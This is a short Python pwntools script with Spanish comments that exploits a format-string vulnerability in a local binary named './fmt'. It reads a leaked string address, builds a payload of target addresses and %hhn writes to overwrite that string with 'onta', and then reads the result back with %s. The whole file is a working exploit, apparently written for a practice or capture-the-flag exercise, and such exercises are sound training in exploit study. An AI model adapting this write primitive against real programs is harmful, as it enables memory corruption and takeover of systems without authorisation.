#!/usr/bin/python

from pwn import *
import sys

PATH = './fmt'
CADENA_NUEVA = 'onta'
PARAMETRO_INICIAL = 8   # Offset del parametro inicial

p = process (PATH)

cadena_addr = int(p.recv().split()[-1],16)
print ("[+] Direccion obtenida para la cadena: " + str(hex(cadena_addr)))

# Construimos el payload
payload  = p32(cadena_addr)  		# Direccion para leer
payload += p32(cadena_addr+2)		# Direccion del primer byte para escribir
payload += p32(cadena_addr+3)		# Direccion del segundo byte para escribir
payload += p32(cadena_addr+4)		# Direccion del tercer byte para escribir
payload += p32(cadena_addr+5)		# Direccion del cuarto byte para escribir
payload += "|"

valor_inicial = len(payload)
par = PARAMETRO_INICIAL
offset_par = 1
for caracter in CADENA_NUEVA: 
	valor = ord(caracter)
	offset = (valor-valor_inicial)%256
	#print ("[+] Caracter: %c, valor: %d, Offset: %d" % (caracter, valor, offset))
	payload += "%" + str(offset) + "x%" + str(par + offset_par) + "$hhn"
	offset_par += 1
	valor_inicial = valor

payload += "|%" + str(par) + "$s"

# Ahora enviamos el payload al otro extremo

p.sendline(payload)
resultado = p.recv().split('|')[-1]
print ("[+] Resultado obtenido: " + resultado)









